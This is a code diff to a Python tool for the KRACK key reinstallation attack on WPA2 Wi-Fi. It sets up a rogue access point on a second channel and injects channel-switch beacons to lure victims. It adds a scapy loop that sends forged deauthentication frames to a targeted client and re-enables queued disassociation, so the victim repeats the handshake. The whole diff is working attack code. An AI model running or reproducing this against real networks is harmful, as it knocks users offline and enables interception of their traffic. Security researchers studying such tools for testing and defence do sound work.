@@ -579,6 +579,7 @@ class KRAckAttack():
 			log(WARNING, "Attack not yet tested against 5 GHz networks.")
 		self.netconfig.find_rogue_channel()
 		self.sock_rogue.set_channel(self.netconfig.rogue_channel)
+		self.sock_real.set_channel(self.netconfig.real_channel)
 
 		log(STATUS, "Target network %s detected on channel %d" % (self.apmac, self.netconfig.real_channel), color="green")
 		log(STATUS, "Will create rogue AP on channel %d" % self.netconfig.rogue_channel, color="green")
@@ -611,16 +612,18 @@ class KRAckAttack():
 		# Inject some CSA beacons to push victims to our channel
 		self.send_csa_beacon(numbeacons=4)
 
+		# subprocess.check_output(["iw", self.nic_real_clientack, "set", "channel", str(self.netconfig.real_channel)])
+
 		# deauthenticated 所有 client端，讓 AP 端重新四次交握
-		# for i in range(0, 11):
-		# 	dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
-		# 	deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
-		# 	self.sock_real.send(deauth)
-		subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
+		for i in range(0, 11):
+			dot11 = Dot11(addr1=self.clientmac, addr2=self.apmac, addr3=self.apmac)
+			deauth = RadioTap()/dot11/Dot11Deauth(reason=7)
+			self.sock_real.send(deauth)
+		# subprocess.call(["aireplay-ng", "-0", "10", "-a", self.apmac, "-c", self.clientmac, self.nic_real_mon])
 
 		# For good measure, also queue a dissasociation to the targeted client on the rogue channel
-		# if self.clientmac:
-		# 	self.queue_disas(self.clientmac)
+		if self.clientmac:
+			self.queue_disas(self.clientmac)
 
 		# Continue attack by monitoring both channels and performing needed actions
 		self.last_real_beacon = time.time()
